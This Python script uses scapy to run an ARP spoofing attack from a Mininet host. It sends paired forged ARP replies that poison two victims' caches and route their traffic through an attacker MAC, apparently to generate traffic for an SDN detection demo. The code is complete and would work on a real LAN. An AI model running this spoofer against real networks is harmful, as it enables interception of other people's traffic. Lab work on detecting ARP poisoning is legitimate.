#!/usr/bin/env python3
"""Run a controlled ARP spoofing traffic pattern from a Mininet host.

Example usage (from the Mininet CLI):
    mininet> hacker .venv/bin/python3 src/scripts/arp_spoof.py \
        --victim-a-ip 10.0.3.10 --victim-a-mac 00:00:00:00:03:10 \
        --victim-b-ip 10.0.3.20 --victim-b-mac 00:00:00:00:03:20 \
        --attacker-mac 00:00:00:00:09:09 -i hacker-eth0 -d 30 -p 10

Note:
    - The mininet topology is created with `autoSetMacs=True`, so you will need to look for the 
    actual MAC addresses of the victim hosts in the Mininet CLI output manually and use those in the command above.
"""

from __future__ import annotations

import argparse
import time
from ipaddress import IPv4Address

import scapy.all as scapy  # type: ignore[import-untyped]

FILE_NAME = __file__.split("/")[-1]

DEFAULT_ARP_SPOOF_DURATION_SEC = 30
DEFAULT_ARP_SPOOF_PPS = 10


def arp_spoof(
    *,
    victim_a_ip: IPv4Address,
    victim_a_mac: str,
    victim_b_ip: IPv4Address,
    victim_b_mac: str,
    attacker_mac: str,
    duration: int = DEFAULT_ARP_SPOOF_DURATION_SEC,
    pps: int = DEFAULT_ARP_SPOOF_PPS,
    interface: str = "hacker-eth0",
) -> None:
    """Send forged ARP replies to poison two hosts' ARP caches.

    Tells victim_a that victim_b is at attacker_mac, and vice versa.
    Traffic between the two victims will be redirected to the attacker.

    Args:
        victim_a_ip: First victim IPv4 address.
        victim_a_mac: First victim MAC address.
        victim_b_ip: Second victim IPv4 address.
        victim_b_mac: Second victim MAC address.
        attacker_mac: Attacker MAC address to inject into victim ARP caches.
        duration: How long to sustain spoofing in seconds.
        pps: ARP reply pairs per second.
        interface: Egress interface name (required for L2 sendp).
    """
    if duration <= 0:
        msg = "Duration must be greater than 0"
        raise ValueError(msg)
    if pps <= 0:
        msg = "Packets per second must be greater than 0"
        raise ValueError(msg)

    interval = 1.0 / pps
    end_time = time.monotonic() + duration
    sent_packets = 0

    print(
        f"[{FILE_NAME}] Starting ARP poison: "
        f"victim_a={victim_a_ip}/{victim_a_mac} "
        f"victim_b={victim_b_ip}/{victim_b_mac} "
        f"{attacker_mac=} "
        f"{interface=} duration={duration}s {pps=}"
    )

    # Tell victim_a: "victim_b's IP is at attacker_mac"
    poison_a = (
        scapy.Ether(dst=victim_a_mac, src=attacker_mac)
        / scapy.ARP(
            op=2,
            hwsrc=attacker_mac,
            psrc=str(victim_b_ip),
            hwdst=victim_a_mac,
            pdst=str(victim_a_ip),
        )
    )

    # Tell victim_b: "victim_a's IP is at attacker_mac"
    poison_b = (
        scapy.Ether(dst=victim_b_mac, src=attacker_mac)
        / scapy.ARP(
            op=2,
            hwsrc=attacker_mac,
            psrc=str(victim_a_ip),
            hwdst=victim_b_mac,
            pdst=str(victim_b_ip),
        )
    )

    while time.monotonic() < end_time:
        # Use `sendp` for L2 instead of `send` with its additional IP header.
        scapy.sendp(poison_a, iface=interface, verbose=False)
        scapy.sendp(poison_b, iface=interface, verbose=False)
        sent_packets += 2
        time.sleep(interval)

    print(f"[{FILE_NAME}] done - {sent_packets} forged ARP replies sent")


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Generate ARP spoofing traffic for SDN detection demo.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "-vai", "--victim-a-ip",
        required=True, type=IPv4Address,
        help="First victim IPv4 address",
    )
    parser.add_argument(
        "-vam", "--victim-a-mac",
        required=True, type=str,
        help="First victim MAC address",
    )
    parser.add_argument(
        "-vbi", "--victim-b-ip",
        required=True, type=IPv4Address,
        help="Second victim IPv4 address",
    )
    parser.add_argument(
        "-vbm", "--victim-b-mac",
        required=True, type=str,
        help="Second victim MAC address",
    )
    parser.add_argument(
        "-am", "--attacker-mac",
        required=True, type=str,
        help="Attacker MAC address to inject into victim ARP caches",
    )
    parser.add_argument(
        "-d", "--duration",
        type=int, default=DEFAULT_ARP_SPOOF_DURATION_SEC,
        help="Spoof duration in seconds",
    )
    parser.add_argument(
        "-p", "--pps",
        type=int, default=DEFAULT_ARP_SPOOF_PPS,
        help="ARP reply pairs per second",
    )
    parser.add_argument(
        "-i", "--interface",
        type=str, default="hacker-eth0",
        help="Egress interface (required for L2 injection)",
    )
    return parser


def main() -> None:
    """Entry point for the script."""
    args = _build_parser().parse_args()
    arp_spoof(
        victim_a_ip=args.victim_a_ip,
        victim_a_mac=args.victim_a_mac,
        victim_b_ip=args.victim_b_ip,
        victim_b_mac=args.victim_b_mac,
        attacker_mac=args.attacker_mac,
        duration=args.duration,
        pps=args.pps,
        interface=args.interface,
    )


if __name__ == "__main__":
    main()